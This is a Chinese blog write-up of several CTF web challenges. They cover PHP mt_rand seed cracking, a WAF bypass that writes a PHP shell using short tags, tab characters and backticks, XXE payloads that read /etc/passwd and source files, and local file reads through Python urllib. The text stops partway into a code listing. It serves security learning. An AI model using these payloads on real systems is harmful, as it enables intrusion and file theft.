<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>猜字符串游戏，猜不了一点<br>看看源码<br>源码中找到一个php文件check.php<br>没问题可以进去<br>源码发现真的是随机数啊<br>对函数挨个搜索后发现mt_srand和mt_rand是有一个伪随机数漏洞<br>我的理解是mt_srand($seed)，种子值就是提供了一个初始的值<br>如果以同样的mt_srand($seed)值调用mt_rand(),那么每次程序运行都会得到相同的随机数序列</p>
<p>现在已经知道了前10个字符，那么可以通过已知的字符来推出种子值，这需要借助一个工具<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a><br>php_mt_seed是c语言编写的爆破随机数序列种子的工具，这里我选择的是kali系统，在目录下运行make命令就配置好了<br><img src="/images/UEGFLJDLTAGX3D9N.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/BHD9I0PD4MM8RB49POT.png" srcset="/img/loading.gif" lazyload><br>使用官方文档中的使用方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&#x27;</span>;<br>   <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br>   <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<br>   <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span>  &quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>需要将我们的序列转换为php_mt_seed可以识别的格式<br><img src="/images/Z4G7O5TWL8KY09.png" srcset="/img/loading.gif" lazyload><br>然后</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">./php_mt_seed<span class="hljs-number"> 30 </span>30<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 55 </span>55<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 50 </span>50<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 22 </span>22<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 38 </span>38<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 8 </span>8<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 55 </span>55<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 19 </span>19<span class="hljs-number"> 0 </span>61<br></code></pre></td></tr></table></figure>
<p><img src="/images/L7EBWVPZMJ2KLWYNUOI.png" srcset="/img/loading.gif" lazyload></p>
<p>这里就获得了seed值735396921</p>
<p>执行题目源代码，确认我们的seed值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">735396921</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//4jjTOwCiTtBHTQBt4oBa</span><br></code></pre></td></tr></table></figure>
<p>成功反推<br>填空即可得到flag</p>
<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>        <span class="hljs-comment">//遍历数组</span><br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>先了解下??的作用</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby">switch(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] <span class="hljs-string">??</span> <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-string">??</span> 判断一个变量是否存在，存在则复制变量本身，不存在赋值另一变量<br><span class="hljs-string">??</span> 相当于：isset(<span class="hljs-variable">$a</span>)<span class="hljs-string">?$</span><span class="hljs-symbol">a:</span><span class="hljs-variable">$b</span>;<br>是php7 推出来的<br>可以简单理解为 用于简便三元表达式<br><br><span class="hljs-variable">$a</span> = <span class="hljs-number">50</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$a</span> <span class="hljs-string">??</span> <span class="hljs-number">1</span>;<br>var_dump(<span class="hljs-variable">$a</span>);<span class="hljs-regexp">//</span><span class="hljs-number">50</span><br></code></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>如果dir不存在，创建一个dir文件<br>再整理下思路<br>先让action等于pwd，先得出我们的文件路径<br>然后再让action等于upload，先看下面有一个file_put_contents()函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">file_put_contents</span><span class="hljs-params">()</span></span><br><br>file 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。<br>data 必需。规定要写入文件的数据。可以是字符串、数组或数据流。<br>mode 可选。规定如何打开/写入文件。<br></code></pre></td></tr></table></figure>
<p>我们要在index.php下写入数据<br>这题由于写入的文件是后缀名为php的，也就是说我们的语法就得满足php，并且达到命令执行的点。<br>但是这题把php给ban了，我们可以使用<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32320151/article/details/53607616">php的短标签</a><br>要确保php配置为short_open_tag &#x3D; On 才能使用</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"> //相当于</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span>;<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml">//相当于</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>空格也被过滤了，这里使用%09绕过<br>php支持一个执行运算符–反引号。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数shell_exec() 相同。<br>这题用system不太行，不知道是什么原因，chat给出的解释是<br>echo <code>ls</code> 执行 ls 命令，然后将 ls 命令的输出作为字符串直接输出到页面。</p>
<p>echo system(‘ls’) 执行 ls 命令，并将 ls 命令的执行结果的退出状态（通常是 0 表示成功）输出到页面。<br>但是我echo system(ls)是成功回显index.php的，到echo system(ls &#x2F;)会报错</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Parse</span> <span class="hljs-literal">error</span>: syntax <span class="hljs-literal">error</span>, unexpected <span class="hljs-string">&#x27;)&#x27;</span> <br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">?action=upload&amp;data=&lt;?=%09<span class="hljs-string">`ls`</span>?&gt;<br><span class="hljs-comment">//index.php</span><br><br>?action=upload&amp;data=&lt;?=%09<span class="hljs-string">`ls%09/`</span>?&gt;<br><span class="hljs-comment">//bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><br>?action=upload&amp;data=&lt;?=%09<span class="hljs-string">`cat%09/flllllll1112222222lag`</span>?&gt;<br><span class="hljs-comment">//flag&#123;74410ae5-1628-4222-bfc6-b959ac2b56ec&#125;</span><br></code></pre></td></tr></table></figure>

<p>找到了system为什么报错的原因，很简单的错误😭<br>echo system(ls)时正常执行而echo system(ls &#x2F;)报错是因为 ls &#x2F; 中的空格被解释为命令参数的分隔符，在 PHP 中，应该使用字符串来表示整个命令，而且最好使用单引号或双引号包裹整个命令，以避免空格导致的问题。<br>因为本题ban了单引号，我们用双引号括起来就可以正常执行命令了。。</p>
<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>xxe漏洞<br>源码中有一段js代码，除了知道他是xml格式再无太大联系<br>随便输入数据抓个包<br><img src="/images/8DLDKYTC58PVTNE1.png" srcset="/img/loading.gif" lazyload><br>抓到xml数据<br>开始漏洞注入<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/SDD5GEORQT1HCX3W1R.png" srcset="/img/loading.gif" lazyload></p>
<p>也可以php伪协议看看doLogin.php的源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<p><img src="/images/Z1R1SYAUHCU16EWYOB8.png" srcset="/img/loading.gif" lazyload></p>
<p>doLogin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>账号密码可以登录，但没什么用</p>
<p>看了看别人的博客，要读取一个&#x2F;proc&#x2F;net&#x2F;arp文件<br>访问&#x2F;proc&#x2F;net&#x2F;arp文件时查看有无可利用内网主机等，然后通过爆破主机地址进行访问<br><img src="/images/KJVGJPMMZ7DAP5V3TRE.png" srcset="/img/loading.gif" lazyload><br>这里说是用xxe内网探测存活的主机<br>两个ip都读取了<br>但是都显示504，正常应该报错然后再爆破最后一位<br>找了半天，说是由于buuctf转用了K8S管理，他的靶机容器是随机在80，81两个网段里的，具体情况看&#x2F;proc&#x2F;net&#x2F;fib_trie<br><img src="/images/XLQNKPD1EG3ZV5NX.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/K9961IT2FQXBLF85HB.png" srcset="/img/loading.gif" lazyload><br>这回倒是报错了<br><img src="/images/MM97UEZXKZEXPBQ.png" srcset="/img/loading.gif" lazyload><br>爆破最后一位，这里我也不知道为什么要爆破最后一位<br><img src="/images/T8Y63VNM4WWU7XW40M.png" srcset="/img/loading.gif" lazyload><br>等待<br><img src="/images/8675JE0N4QOX8HO.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>python2的urllib的urlopen，和urllib2中的urlopen明显区别就是urllib.urlopen支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件<br>python2</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">import urllib<br><span class="hljs-attribute">url</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/etc/passwd&quot;</span><br><span class="hljs-attribute">res</span> <span class="hljs-operator">=</span> urllib.urlopen(url)<br>print(res.read())<br></code></pre></td></tr></table></figure>
<p><img src="/images/LGJFHZSEISV131IO.png" srcset="/img/loading.gif" lazyload></p>
<p>python3</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import urllib<span class="hljs-selector-class">.request</span><br>url=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span><br>res = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(url)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(res.read()</span></span>)<br></code></pre></td></tr></table></figure>
<p><img src="/images/DC82SK28CMD651W3WF.png" srcset="/img/loading.gif" lazyload></p>
<p>只有一个输入框，随便提交一个数据后会跳转到page页面，参数名为url，通过输入网址可以以beautiful.jpg返回网址的源码<br>为了方便，这里用burp<br><img src="/images/IY3M6OYPCUSTF32JMN70UE.png" srcset="/img/loading.gif" lazyload><br>多次尝试读取文件的方法，最后发现直接输入路径即可（这里印证了可能是python2的urllib的urlopen）<br><img src="/images/K5W2JRHH7XFCWD3QE.png" srcset="/img/loading.gif" lazyload><br>非预期解是在这里直接读&#x2F;flag，可以直接读出来<br><img src="/images/PR1RDD2P6XYNJO.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>proc目录</li>
</ul>
<p>proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。<br>还有的是一些以数字命名的目录，他们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的PID号为目录名，他们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link</p>
<p>在&#x2F;proc文件系统中，每一个进程都有一个相应的文件。下面是&#x2F;proc目录下的一些重要文件，pid是进程的标号：</p>
<ul>
<li>&#x2F;proc&#x2F;pid&#x2F;cmdline 是一个只读文件，包含进程的完整命令行信息</li>
<li>&#x2F;proc&#x2F;pid&#x2F;cwd 包含了当前进程工作目录的一个链接</li>
<li>&#x2F;proc&#x2F;pid&#x2F;environ 包含了可用进程环境变量的列表</li>
<li>&#x2F;proc&#x2F;pid&#x2F;exe 包含了正在进程中运行的程序链接</li>
<li>&#x2F;proc&#x2F;pid&#x2F;fd&#x2F; 这个目录包含了进程打开的每一个文件的链接</li>
<li>&#x2F;proc&#x2F;pid&#x2F;mem 包含了进程在内存中的内容</li>
<li>&#x2F;proc&#x2F;pid&#x2F;stat 包含了进程的状态信息</li>
<li>&#x2F;proc&#x2F;pid&#x2F;statm 包含了进程的内存使用信息</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.linuxprobe.com/linux-proc-pid.html">简析Linux中 &#x2F;proc&#x2F;[pid] 目录的各文件</a><br>&#x2F;proc&#x2F;self表示当前进程目录<br>输入&#x2F;proc&#x2F;self&#x2F;cmdline<br><img src="/images/MKLTD6S4IZ17QPR.png" srcset="/img/loading.gif" lazyload><br>读一下app.py</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 